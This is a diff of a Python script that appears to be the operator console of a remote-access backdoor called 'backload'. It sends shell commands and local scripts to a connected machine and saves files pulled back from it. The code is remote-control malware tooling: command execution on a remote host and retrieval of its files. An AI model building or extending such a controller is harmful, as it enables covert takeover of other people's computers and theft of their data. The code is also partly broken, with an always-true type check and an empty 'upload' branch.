@@ -27,30 +27,54 @@ except:
 
 while True:
     command = input("backload> ")
-    if command.split()[0] == "runscript":
+    if command.split(" ")[0] == "runscript" and len(command.split(" ")) == 2:
         filecontent = None
-        try:
-            script = command.split(" ")[1]
-        except:
-            print("[sintax] 'runscript {path}'")
+        script = command.split(" ")[1]
+
         try:
             filescript = open(script, "r")
             filecontent = filescript.read()
             filescript.close()
+
         except:
             print("[err] impossibile trovare il path dello script")
+
         if type(filecontent) != "<class 'str'>":
             Connection.SEND("scr" + filecontent)
 
-    else:
-        Connection.SEND("com" + command.replace("\\", "\\\\"))
+    elif command.split(" ")[0] == "upload":
+        filecontent = None
 
-    response = Connection.RECV()
-    if response != False:
-        try:
-            print(response.decode())
-        except:
-            print("[err] impossibile mettere in output il messaggio ricevuto")
+
     else:
-        print("[err] connessione caduta")
-        break
+        try:
+            Connection.SEND("com" + command)
+        except:
+            print("[err] connessione caduta")
+            break
+    response = Connection.RECV()
+
+    if response != False:
+        if response.split(b'@')[0] == b'file':
+            file = open("download", "wb+")
+            response = response.split(b'@')
+            response.pop(0)
+            payload = b''
+            for index in response:
+                payload = payload + index + b'@'
+            payload = payload.decode("ascii", "ignore")
+            payload = list(payload)
+            payload.pop(-1)
+            payload = "".join(payload).encode()
+            file.write(payload)
+            file.close()
+            print("file ricevuto e salvato in 'download'")
+
+        else:
+            try:
+                print(response.decode("ascii", "ignore"))
+            except:
+                print("[err] impossibile mettere in output il messaggio ricevuto")
+    else:
+        print("errore in 'Connection.RECV()'")
+        pass
